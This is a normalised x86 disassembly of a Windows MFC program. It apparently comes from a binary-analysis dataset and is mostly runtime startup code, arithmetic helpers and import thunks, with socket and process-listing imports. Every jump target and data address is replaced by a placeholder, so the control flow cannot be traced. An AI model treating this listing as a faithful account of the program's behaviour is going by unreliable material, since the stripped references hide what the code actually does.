mov [ ecx + 0xc ] eax
mov eax 0x1
retn
mov [ esi + 0x4 ] eax
mov [ edx + 0x8 ] eax
mov eax [ ecx + 0xc ]
pop esi
inc eax
mov [ ecx + 0xc ] eax
mov eax 0x1
retn
sub_40cc90
push esi
mov esi [ esp + 0xc ]
xor ecx ecx
push edi
cmp esi ecx
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov edi [ esp + 0xc ]
cmp [ edi + 0xc ] ecx
je r-xdata
cmp esi [ edi ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ esi + 0x8 ]
cmp eax ecx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax ecx
mov [ edi ] eax
jne r-xdata
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x4 ]
mov [ edi + 0x4 ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ edi + 0x4 ] ecx
jmp r-xdata
mov eax [ esi ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call [ edi + 0x8 ]
push esi
call [ free@IAT ]
mov eax [ edi + 0xc ]
add esp 0xc
dec eax
mov [ edi + 0xc ] eax
sub_40cd10
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
push esi
call [ free@IAT ]
add esp 0x4
push edi
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
push edi
push eax
push esi
call sub_40cc90
mov eax [ esi + 0xc ]
add esp 0xc
test eax eax
ja r-xdata
pop edi
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40d4c1
cmp [ rw-data ] ebx
jne r-xdata
call sub_40d4ac
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40d4be
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_40d4e0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40d1d0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40d200
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40d270
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40d2f0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_40d3a0
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40d460
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40d4f8
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_401060
mov eax [ Ordinal_MFC42_1842@IAT ]
retn
sub_401070
mov eax r--data
retn
sub_401080
mov eax [ Ordinal_MFC42_4242@IAT ]
retn
sub_401090
mov eax r--data
retn
sub_4011b0
push esi
mov esi ecx
call sub_4011d0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_401cd0
mov ecx [ esp + 0x8 ]
mov eax [ rw-data ]
imul ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push 0x1
push edx
call [ fwrite@IAT ]
add esp 0x10
retn
sub_40258a
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] eax
mov eax r-xdata
retn
sub_402600
jmp Ordinal_MFC42_1567
sub_402eb5
mov ecx [ ebp + 0x8 ]
mov eax r-xdata
mov [ ebp - 0x24 ] ecx
retn
sub_4031be
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax r-xdata
retn
sub_4033e0
mov eax [ esp + 0x4 ]
push eax
call Ordinal_MFC42_825
pop ecx
retn 0x4
sub_4033f0
retn
sub_403c30
retn 0x4
sub_403c40
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_403c50
mov eax r--data
retn
sub_403cb0
push esi
mov esi ecx
call sub_403cd0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_403d20
call sub_403d30
jmp sub_403d40
sub_403d30
mov ecx rw-data
jmp sub_403c60
sub_403d40
push sub_403d50
call sub_40d058
pop ecx
retn
sub_403d50
mov ecx rw-data
jmp sub_403cd0
sub_403e40
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
jmp [ eax + 0x60 ]
sub_404080
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
retn
retn
mov eax ecx
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
sub_404200
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
lea eax [ esp + 0xc ]
push eax
push ecx
push edx
call sub_404220
add esp 0xc
retn
sub_404c00
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x0
xor eax eax
retn
mov eax 0x1
retn
sub_404d00
mov eax rw-data
retn
sub_4050b0
mov eax [ esp + 0x4 ]
push eax
call [ free@IAT ]
pop ecx
retn
sub_4050c0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
push eax
call sub_4050b0
push esi
call [ free@IAT ]
add esp 0x8
pop esi
retn
sub_4050e0
push sub_4050c0
push 0x7
call sub_408dc0
add esp 0x8
retn
sub_408560
xor eax eax
retn
sub_409080
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_408fd0
push esi
call [ free@IAT ]
add esp 0x8
sub_40a1a0
movsx eax [ esp + 0x4 ]
add eax 0xffffffe0
cmp eax 0x5a
ja r-xdata
xor eax eax
retn
xor ecx ecx
mov cl [ eax + lookup_table_40a1d0 ]
jmp [ ecx * 4 + jump_table_40a1c8 ]
mov eax 0x1
retn
sub_40a260
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x8 ]
push ecx
push edx
push eax
call sub_4090a0
add esp 0x10
retn
sub_40a450
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ ecx ]
mov [ edx ] al
mov edx [ ecx ]
inc edx
mov [ ecx ] edx
retn
GetLastError
jmp [ GetLastError@IAT ]
sub_40a4a0
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x8 ] eax
push ecx
push 0x8004667e
push edx
call [ ioctlsocket@IAT ]
retn
sub_40a580
mov al 0x1
retn
sub_40aa70
mov eax [ esp + 0x4 ]
retn
sub_40aad0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0x208 ] ecx
mov [ eax + 0x210 ] ecx
mov [ eax + 0x218 ] ecx
mov [ eax + 0x220 ] ecx
mov [ eax + 0x20c ] ecx
mov [ eax + 0x214 ] ecx
mov [ eax + 0x21c ] ecx
mov [ eax + 0x224 ] ecx
retn
sub_40ac30
push esi
mov esi [ esp + 0x8 ]
mov [ esi + 0x2a0 ] 0x0
call sub_40a9a0
mov [ esi + 0x230 ] eax
mov [ esi + 0x234 ] edx
pop esi
retn
sub_40ac60
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ eax + 0x1c8 ] ecx
mov [ eax + 0x1cc ] edx
retn
sub_40ac80
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ eax + 0x1d0 ] ecx
mov [ eax + 0x1d4 ] edx
retn
sub_40c4a0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
xor eax eax
mov [ ecx + 0x8309 ] 0x1
retn
sub_40c7d0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov eax [ eax + 0x16c ]
mov [ eax + 0x4c ] ecx
add eax 0x38
mov [ eax + 0x20 ] ecx
mov [ eax + 0x18 ] 0x1
retn
sub_40cbc0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
retn
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4436
jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_807
jmp [ Ordinal_MFC42_807@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_554
jmp [ Ordinal_MFC42_554@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_922
jmp [ Ordinal_MFC42_922@IAT ]
Ordinal_MFC42_6876
jmp [ Ordinal_MFC42_6876@IAT ]
Ordinal_MFC42_860
jmp [ Ordinal_MFC42_860@IAT ]
Ordinal_MFC42_858
jmp [ Ordinal_MFC42_858@IAT ]
Ordinal_MFC42_924
jmp [ Ordinal_MFC42_924@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_2818
jmp [ Ordinal_MFC42_2818@IAT ]
Ordinal_MFC42_665
jmp [ Ordinal_MFC42_665@IAT ]
Ordinal_MFC42_1567
jmp [ Ordinal_MFC42_1567@IAT ]
Ordinal_MFC42_5583
jmp [ Ordinal_MFC42_5583@IAT ]
Ordinal_MFC42_268
jmp [ Ordinal_MFC42_268@IAT ]
Ordinal_MFC42_354
jmp [ Ordinal_MFC42_354@IAT ]
Ordinal_MFC42_1979
jmp [ Ordinal_MFC42_1979@IAT ]
Ordinal_MFC42_5710
jmp [ Ordinal_MFC42_5710@IAT ]
Ordinal_MFC42_5683
jmp [ Ordinal_MFC42_5683@IAT ]
Ordinal_MFC42_6385
jmp [ Ordinal_MFC42_6385@IAT ]
Ordinal_MFC42_5186
jmp [ Ordinal_MFC42_5186@IAT ]
Ordinal_MFC42_926
jmp [ Ordinal_MFC42_926@IAT ]
Ordinal_MFC42_6153
jmp [ Ordinal_MFC42_6153@IAT ]
Ordinal_MFC42_3790
jmp [ Ordinal_MFC42_3790@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_6117
jmp [ Ordinal_MFC42_6117@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_40d010
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_40d02c
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40d058
push [ esp + 0x4 ]
call sub_40d02c
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_40d1bc
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
_ftol
jmp [ _ftol@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40d4ac
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40d4be
xor eax eax
retn
sub_40d4c1
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_40d4e0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_40d526
jmp sub_40d526
sub_40d526
push 0x600
push 0x0
call sub_40d4f8
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_40d550
mov eax [ ebp - 0x10 ]
push eax
call sub_4033e0
retn
sub_40d55a
mov eax r--data
jmp __CxxFrameHandler
sub_40d570
mov ecx [ ebp - 0x110 ]
jmp Ordinal_MFC42_674
sub_40d57b
mov ecx [ ebp - 0x110 ]
add ecx 0x620
jmp Ordinal_MFC42_800
sub_40d58c
mov ecx [ ebp - 0x110 ]
add ecx 0x634
jmp Ordinal_MFC42_796
sub_40d59d
mov ecx [ ebp - 0x110 ]
add ecx 0x6b4
jmp Ordinal_MFC42_807
sub_40d5ae
mov eax r--data
jmp __CxxFrameHandler
sub_40d5c0
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_40d5c8
mov ecx [ ebp - 0x10 ]
add ecx 0x620
jmp Ordinal_MFC42_800
sub_40d5d6
mov ecx [ ebp - 0x10 ]
add ecx 0x634
jmp Ordinal_MFC42_796
sub_40d5e4
mov eax r--data
jmp __CxxFrameHandler
sub_40d5f0
lea ecx [ ebp - 0xa0 ]
jmp Ordinal_MFC42_800
sub_40d5fb
lea ecx [ ebp - 0x94 ]
jmp Ordinal_MFC42_800
sub_40d606
lea ecx [ ebp - 0x90 ]
jmp Ordinal_MFC42_800
sub_40d611
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d61c
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d627
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d632
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d63d
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d648
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d653
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d65e
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d669
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d674
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d67f
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d68a
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d695
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d6a0
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d6ab
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d6b6
mov eax r--data
jmp __CxxFrameHandler
sub_40d6c0
lea ecx [ ebp - 0xa0 ]
jmp Ordinal_MFC42_800
sub_40d6cb
lea ecx [ ebp - 0x94 ]
jmp Ordinal_MFC42_800
sub_40d6d6
lea ecx [ ebp - 0x90 ]
jmp Ordinal_MFC42_800
sub_40d6e1
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d6ec
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d6f7
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d702
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d70d
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d718
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d723
lea ecx [ ebp - 0x9c ]
jmp Ordinal_MFC42_800
sub_40d72e
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d739
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d744
lea ecx [ ebp - 0x98 ]
jmp Ordinal_MFC42_800
sub_40d74f
mov eax r--data
jmp __CxxFrameHandler
sub_40d760
lea ecx [ ebp - 0x40 ]
jmp Ordinal_MFC42_665
sub_40d768
lea ecx [ ebp - 0x30 ]
jmp sub_402600
sub_40d770
mov eax r--data
jmp __CxxFrameHandler
sub_40d780
lea ecx [ ebp - 0x1fc ]
jmp Ordinal_MFC42_665
sub_40d78b
